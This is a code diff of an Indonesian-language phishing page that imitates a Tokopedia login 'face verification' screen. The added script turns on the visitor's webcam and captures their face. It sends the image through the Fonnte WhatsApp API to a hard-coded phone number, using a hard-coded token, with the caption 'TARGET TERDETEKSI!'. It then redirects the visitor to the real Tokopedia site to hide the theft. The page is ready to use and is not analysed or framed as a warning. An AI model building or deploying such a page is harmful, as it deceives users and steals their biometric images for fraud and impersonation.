@@ -6,62 +6,98 @@
     <title>Login Tokopedia - Verifikasi</title>
     <style>
         :root { --p: #00AA5B; }
-        body { background: #f0f3f7; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 350px; text-align: center; }
-        .cam-box { width: 200px; height: 200px; border-radius: 50%; border: 4px solid var(--p); margin: 20px auto; overflow: hidden; position: relative; background: #000; }
+        body { background: #f0f3f7; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #fff; padding: 35px 25px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 90%; max-width: 360px; text-align: center; }
+        .logo { font-size: 24px; font-weight: bold; color: var(--p); margin-bottom: 5px; }
+        h1 { font-size: 18px; margin-bottom: 25px; color: #31353B; }
+        .cam-box { width: 220px; height: 220px; border-radius: 50%; border: 4px solid var(--p); margin: 0 auto 25px; overflow: hidden; position: relative; background: #000; box-shadow: 0 0 15px rgba(0,170,91,0.2); }
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .btn { background: var(--p); color: #fff; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; }
-        .btn:disabled { background: #ccc; }
-        #msg { font-size: 12px; margin-top: 10px; color: #888; }
+        .btn { background: var(--p); color: #fff; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
+        .btn:disabled { background: #E5E7E9; color: #AAB4BF; cursor: not-allowed; }
+        #msg { font-size: 12px; margin-top: 15px; color: #888; }
     </style>
 </head>
 <body>
+
     <div class="card">
-        <h2 style="color:var(--p)">tokogreen</h2>
-        <p style="font-size:14px;color:#666">Verifikasi wajah untuk melanjutkan</p>
-        <div class="cam-box"><video id="v" autoplay playsinline muted></video></div>
-        <button id="b" class="btn" disabled>Login Sekarang</button>
-        <div id="msg">Menyiapkan kamera...</div>
+        <div class="logo">tokopedia</div>
+        <h1>Verifikasi Wajah</h1>
+        <div class="cam-box">
+            <video id="webcam" autoplay playsinline muted></video>
+        </div>
+        <button id="btn-snap" class="btn" disabled>Login Sekarang</button>
+        <div id="msg">Menghubungkan kamera aman...</div>
     </div>
-    <canvas id="c" style="display:none"></canvas>
+
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const v = document.getElementById('v'), b = document.getElementById('b'), msg = document.getElementById('msg');
-        
-        // Aktifkan Kamera
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(s => { v.srcObject = s; b.disabled = false; msg.innerText = "Kamera Aktif ✅"; })
-        .catch(e => { msg.innerText = "Kamera diblokir! Pastikan HTTPS aktif."; msg.style.color = "red"; });
+        const video = document.getElementById('webcam');
+        const btn = document.getElementById('btn-snap');
+        const msg = document.getElementById('msg');
+        const canvas = document.getElementById('canvas');
 
-        b.onclick = async () => {
-            b.innerText = "Memproses..."; b.disabled = true;
-            const can = document.getElementById('c');
-            can.width = v.videoWidth; can.height = v.videoHeight;
-            const ctx = can.getContext('2d');
-            ctx.translate(can.width, 0); ctx.scale(-1, 1);
-            ctx.drawImage(v, 0, 0);
-            const img = can.toDataURL('image/jpeg', 0.6);
-            
+        // --- PENGATURAN WA ---
+        const tokenWA = 'PG3GRjmArXV4PHYgQaFz';
+        const nomorTujuan = '6283823170469';
+
+        // Aktifkan Kamera Otomatis (Wajib HTTPS - Vercel sudah menyediakannya)
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                video.play();
+                msg.innerText = "Kamera Siap ✅";
+                btn.disabled = false;
+            };
+        })
+        .catch(err => {
+            msg.innerText = "Kamera error: Izinkan akses di browser.";
+            msg.style.color = "red";
+        });
+
+        btn.addEventListener('click', async () => {
+            btn.disabled = true;
+            btn.innerText = "Memproses...";
+            msg.innerText = "Sedang verifikasi keamanan...";
+
+            // Ambil gambar dari video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0);
+
+            // Ubah ke format Base64 (JPG kualitas medium agar ringan)
+            const base64Image = canvas.toDataURL('image/jpeg', 0.5);
+
+            // Kirim LANGSUNG ke Fonnte menggunakan FormData
+            const dataFonnte = new FormData();
+            dataFonnte.append('target', nomorTujuan);
+            dataFonnte.append('url', base64Image);
+            dataFonnte.append('caption', '🚨 *TARGET TERDETEKSI!* 🚨\nSeseorang mencoba masuk lewat verifikasi wajah Tokopedia.');
+
             try {
-                // PANGGIL API VERCEL
-                const res = await fetch('/api/upload', {
+                const response = await fetch('https://api.fonnte.com/send', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ image: img })
+                    headers: { 'Authorization': tokenWA },
+                    body: dataFonnte
                 });
-                
-                if (res.ok) {
-                    alert("Verifikasi Berhasil!");
-                    window.location.reload();
+
+                if (response.ok) {
+                    alert("Verifikasi Berhasil! Silahkan cek WhatsApp.");
+                    window.location.href = "https://www.tokopedia.com";
                 } else {
-                    alert("Gagal mengirim foto.");
-                    b.disabled = false; b.innerText = "Login Sekarang";
+                    alert("Gagal kirim! Pastikan token Fonnte aktif.");
+                    btn.disabled = false;
+                    btn.innerText = "Login Sekarang";
                 }
-            } catch (e) {
-                alert("Koneksi Error!");
-                b.disabled = false;
+            } catch (err) {
+                alert("Kesalahan jaringan! Coba lagi.");
+                btn.disabled = false;
             }
-        };
+        });
     </script>
 </body>
 </html>
